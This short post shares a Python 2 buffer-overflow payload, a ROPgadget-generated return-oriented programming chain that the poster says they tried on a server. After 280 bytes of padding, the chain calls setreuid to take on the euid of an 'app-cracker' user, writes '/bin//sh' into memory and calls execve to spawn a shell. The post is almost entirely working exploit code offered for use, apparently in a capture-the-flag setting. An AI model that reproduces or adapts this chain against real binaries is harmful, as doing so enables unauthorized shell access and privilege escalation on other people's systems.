




this is payload i try in server !!
```python
 #!/usr/bin/env python2
        # execve generated by ROPgadget

from struct import pack

        # Padding goes here
p = 'A'*280


p += pack('<Q', 0x00000000004016d3)	# pop rdi ; ret	
p += pack('<Q',1234)			#euid of app-cracker
p += pack('<Q', 0x00000000004017e7) # pop rsi ; ret
p += pack('<Q',1234)			#euid of app-cracker
p+=pack('<Q',0x000000000044d2b4)	# pop rax,ret
p+=pack('<Q',113)
p+=pack('<Q',0x000000000045b525)	# syscall ; ret	


p += pack('<Q', 0x00000000004017e7) # pop rsi ; ret
p += pack('<Q', 0x00000000006c0000) # @ .data 								//.data save to rsi
p += pack('<Q', 0x000000000044d2b4) # pop rax ; ret
p += '/bin//sh'																#rax = hex "/bin//sh"
p += pack('<Q', 0x0000000000467b51) # mov qword ptr [rsi], rax ; ret		//move rax -> memory at .data
p += pack('<Q', 0x00000000004017e7) # pop rsi ; ret							//rsi = address of .data +8
p += pack('<Q', 0x00000000006c0008) # @ .data + 8
p += pack('<Q', 0x000000000041bd9f) # xor rax, rax ; ret					//rax = 0
p += pack('<Q', 0x0000000000467b51) # mov qword ptr [rsi], rax ; ret		//[data +8 ] = 0
p += pack('<Q', 0x00000000004016d3) # pop rdi ; ret							//get address bin/sh
p += pack('<Q', 0x00000000006c0000) # @ .data
p += pack('<Q', 0x00000000004017e7) # pop rsi ; ret							//get address 0 to rsi
p += pack('<Q', 0x00000000006c0008) # @ .data + 8
p += pack('<Q', 0x0000000000437205) # pop rdx ; ret							//get address 0 to rdx
p += pack('<Q', 0x00000000006c0008) # @ .data + 8
p += pack('<Q', 0x000000000041bd9f) # xor rax, rax ; ret					//rax =0
p += pack('<Q',0x000000000044d2b4)
p += pack('<Q',59)
p += pack('<Q', 0x000000000045b525) # syscall ; ret						//syscall execv rdi(/bin//sh)

print p
```
